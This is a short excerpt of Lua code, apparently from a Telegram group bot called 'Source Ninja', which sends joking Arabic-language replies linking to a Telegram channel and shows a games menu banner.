send(msg.chat_id_,msg.id_, '[نورك يا قلبي..🌚❤️](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه..😹💥](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا..😂](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚❤️](t.me/so_ninja)')
return false
end
end
end
...
[🎯ألعاب سورس نينجا الاحسن في التليجرام ⇈⇊]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [`𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺´](t.me/so_ninja)
]]
keyboard = {} 
